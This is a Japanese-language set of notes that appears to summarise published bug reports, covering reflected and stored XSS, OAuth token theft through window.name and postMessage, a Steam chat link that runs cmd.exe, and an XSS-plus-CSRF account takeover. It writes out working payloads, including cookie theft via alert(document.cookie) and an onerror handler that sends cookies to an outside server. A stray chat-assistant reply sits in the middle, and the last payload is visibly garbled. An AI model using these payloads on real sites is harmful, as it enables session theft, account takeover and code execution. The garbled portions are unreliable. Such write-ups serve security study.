# XSS: Cross-Site Scripting
### 参考例1

このXSSは、`utm_source` パラメータの入力が**JavaScriptの文脈で直接使用されていた**ことで発生した反射型の脆弱性。入力値が適切にエスケープされておらず、悪意ある入力によりスクリプトを挿入・実行できた。

### 攻撃ペイロード例

```text
utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```
これは URLデコードすると次のようになる：

```text
abc`; return false }); }); alert`xss`; </script>
```

### 想定される実装
広告パラメータを直接読み出しており、サニタイズをしていなかったと想定される。
広告パラメータで処理を変えたい意図があったと思われる。
```javascript
<script>
  var source = "<?= $_GET['utm_source'] ?>";
</script>
```

---

### 参考例

このXSSは、**Markdown中のリンク記法**を利用して `.alert(1);` のような相対パスが、GitLab独自のWikiリンク処理により**javascript:alert(1);** に変換されてしまうことで発生した。生成されたHTMLが`<a href="javascript:alert(1);">`となり、ユーザーがそのリンクをクリックするとスクリプトが実行される。

---

### 攻撃ペイロード例（Markdown）

```markdown
[XSS](.alert(1);)
```

変換後：

```html
<a href="javascript:alert(1);">XSS</a>
```

---

### 想定される実装と問題点

MarkdownをHTMLに変換した後に、以下のような**Wiki専用のパス再構成処理**を行っていた：

```ruby
# lib/banzai/filter/wiki_link_filter/rewriter.rb

def apply_hierarchical_link_rules!
  @uri = Addressable::URI.join(@slug, @uri) if @uri.to_s[0] == '.'
end
```

この処理によって `.alert(1);` のような相対パスが `javascript:alert(1);` として扱われるようになってしまった。

---

### 参考例

プロフィール作成画面において、HTMLタグの`<`および`>`はフィルタリングされていたが、攻撃者は**HTMLエンティティを使ってバイパス**し、スクリプトを埋め込むことに成功していた。これは、前に報告された同種の問題が修正された後にも**別のバイパス手法**で再現可能だった。


### 攻撃ペイロード例

```html
"/> &lt;script&gt;alert(1)&lt;/script&gt;
```

`&lt;` や `&gt;` で `<` と `>` をエンコードすることでフィルタを回避し、XSSを成立させていた。


### 問題点

- `<` や `>` を直接フィルタリングしていたが、**エンティティ形式（`&lt;`, `&gt;`）を考慮していなかった**
- HTML属性（例：`alt`, `title`）内に閉じタグ（`"/>`）を注入できてしまい、**属性を閉じてscriptを挿入可能**だった
- 前回の修正は部分的で、**エスケープ対象の網羅性が不足していた**
- 結果として、ユーザーが攻撃者のページを訪問するだけで**スクリプトが実行される状態**だった

## OAuth2 Token Theft via postMessage and window.name Abuse
### 参考例1（サードパーティOAuth連携）

この攻撃は、OAuthの`response_mode=fragment`と、`window.name`を使った意図しない情報伝播を悪用して、**Apple ID連携を通じたアカウント乗っ取り**を成立させるもの。攻撃者はOAuthの`state`パラメータを事前に用意し、被害者のAppleログイン後に発行される`code`や`id_token`などのトークンを自身のブラウザで取得できるように設計された。

### 攻撃手順（概要）

1. 攻撃者は自身のブラウザでAppleログインを開始し、`state`を取得して保存
2. 被害者に渡す攻撃用ページを生成し、iframeでサンドボックスドメインを読み込ませる
3. iframe内のスクリプトは、改変されたOAuth URL（`response_mode=fragment`, `response_type=code+id_token`）を使ってAppleログインを誘導
4. Appleログイン完了後、メインウィンドウのURLが `#code=...&state=...&id_token=...` のようになる
5. iframeは同一オリジンであるため、親フレームの `window.name` に格納されたURLフラグメント（#以下）を参照可能
6. `postMessage` を利用して親ウィンドウにトークンを送信し、攻撃者が取得

### 技術的詳細

- 脆弱な構成：
  - Apple OAuthで`response_mode=fragment`が許可されていた
  - `window.name`を使ってURL情報（検索パラメータおよびフラグメント）を別ドメインへ伝搬していた
  - Aドメインが任意のGoogle Tag Manager (GTM-ID) を読み込むことが可能だった（攻撃者のスクリプトが実行可能）
  - AドメインとBドメインが同一オリジンと誤解される形で共通のiframeドメインを使っていた

- 攻撃者は iframe の `frames[0].window.name` にフラグメントを含むURLを持たせて情報を取得し、ログ用の外部ドメインへ送信していた

### 問題点

- `response_mode=fragment` の利用時に、トークンがURLに露出する設計でありながら、外部からの読み取りを防止する措置がなかった
- サンドボックス的に使っていたドメインが**任意のGTM-IDを許可していた**ため、攻撃者のJavaScriptが実行可能だった
- `window.name`を**機密情報の伝達に使っていた設計自体が脆弱**
- Aドメインにおけるiframeのロード元が、同一ドメインでiframe間のアクセスが可能となっていた

---

## XSSおよびRCE脆弱性（チャットクライアント）

### 概要

* チャットクライアントはReactで構築され、セキュリティ意識は高いが、BBCodeパーサやOEMBEDなど埋め込み機能により、攻撃対象領域が広がっていた。
* `steam://` プロトコルはカスタムクライアントで確認画面なしに実行されるため、特権コマンドが通る。
* `steam://openexternalforpid/10400/cmd.exe` 形式で任意コマンドを実行可能。

### 技術的詳細

* React製アプリながら、BBCodeベースのチャット表現を使っており、`[url=javascript:...]` によるXSSが可能だった。
* WebSocket通信はバイナリ形式で観測が難しく、XSSはチャット送信後にクライアントがローカルでDOMに挿入していた（即時反映時にXSS）。
* `OEMBED` タグによるiframe埋め込みが可能で、CodePen.ioのようなJS実行可能なサービスがホワイトリストに含まれていた。
* CodePen経由でiframe内部でコード実行でき、さらに `steam://` URI を生成可能。

### 影響範囲

* `[url=steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe]Click me[/url]` のようなリンクを送信すると、相手のクライアントで即座にコマンド実行可能。
* 特定のプロトコル（例：jarfile:）では、ローカルファイルを実行することも可能だった。
* 結果として、\*\*XSSからのRCE（Remote Code Execution）\*\*に繋がる深刻な脆弱性。

### 問題点

* チャット中のBBCode `[url]` に `steam://` や `javascript:` を許可していた。
* OEMBED機能で信頼できないドメインのiframe埋め込みを許可していた。
* WebViewコンテキストの権限が広く、`steam://` URI の確認なし自動実行を許容していた。
* `openexternalforpid` という隠し機能が任意実行に利用できていた。

### 実証結果

* `jarfile:` や `calculator:` などの他プロトコルも調査。
* `steam://openexternalforpid/10400/cmd.exe` でPoC成功。

---

# Reflected XSS + CSRFによるアカウント乗っ取り

### 参考例

あるパラメータが適切にサニタイズされておらず、JavaScriptの文脈で反映されていたことで**反射型XSS**が成立していた。同時に、外部からのPOSTリクエストで**パスワード設定を変更可能なエンドポイント**が存在しており、**CSRFに対して無防備**だった。

これら2つの脆弱性を組み合わせることで、攻撃者は**ワンクリックでアカウントの乗っ取り**が可能だった。

### 攻撃手順（概要）

1. 反射型XSSが発生するURLパラメータに悪意あるJavaScriptを注入（payload内でCSRFリクエストを送信）
2. 被害者がこのリンクをクリックすると、JavaScriptが自動実行され、CSRFリクエストによりパスワードが攻撃者の指定したものに変更される

### 問題点

* ユーザー入力のURLパラメータをエスケープせずHTMLに反映していた
* CSRF保護（トークン確認やOrigin/Refererチェック）がされていなかった
* サードパーティログインユーザーに対しても、追加認証なしにパスワード設定が可能だった
了解。以下はそのままMarkdownとしてコピペできる形式よ：

---

### 参考例：convertro スクリプトのパラメータ注入によるXSS

このXSSは、`location.hash` に含まれる `cvo_sid1` パラメータが `live.js` によりそのまま convertro スクリプトへ渡される設計だったことで発生した。convertro 側ではある程度のサニタイズがされていたが、`cvo_sid1` の値に `typ` パラメータを擬似的に埋め込むことで **レスポンスに任意の JavaScript を混入可能**となっていた。

### 攻撃ペイロード例

```text
#?cvo_sid1=111\u0026;typ=55577]")%3balert(document.cookie)%3b//
```

このような URL によって、レスポンスに以下のようなコードを注入できた：

```javascript
");alert(document.cookie);// 
```

### 問題点

* `cvo_sid1` パラメータ内に `\u0026;typ=` を含めることで、**別パラメータの注入**が可能だった
* クライアント側で `location.hash` を適切にサニタイズしないままスクリプトに渡していた
* convertro の返すレスポンスがそのまま JavaScript として扱われ、**スクリプトインジェクションが成立**
* セミコロン制限を `%3b` によるエンコードで回避できた
* ユーザーがこのリンクを踏むだけで、**cookie やセッション情報を盗まれる危険があった**

---

### 参考例（サポートチャットでの画像アップロード）

このXSSは、**サポートチャットに画像を送信する際、ファイル名に悪意のあるスクリプトを含めることで発生**する。ファイルアップロード時に、ファイル名がHTMLに挿入される処理においてサニタイズが不十分であり、画像の読み込みエラーイベント（`onerror`）を利用したJavaScriptの実行が可能だった。

また、画像をサポートチャットにアップロードすると、**その画像がサポートエージェントから他のユーザーへ一斉に送信される仕様**により、大規模なXSSが成立する。つまり、**一度の攻撃で数千人単位のユーザーにスクリプトが送信される可能性がある**。

### 攻撃ペイロード例

```html
"><img src=1 onerror="url=String104,116,116,112,...;xhttp= new XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
```

※`onerror`内でCookieなどの情報を外部に送信する。

### 問題点

* ファイルアップロード時の**ファイル名に対するサニタイズが不十分**
* 画像の`onerror`イベントによりJavaScriptが実行可能
* サポートチャットが**画像を多数のユーザーに再送信する仕様**だったため、**XSSが大量拡散する構造的欠陥**があった
* エージェント側での送信はユーザーの操作なしで実行されるため、**意図せず攻撃が展開される**構造になっていた

---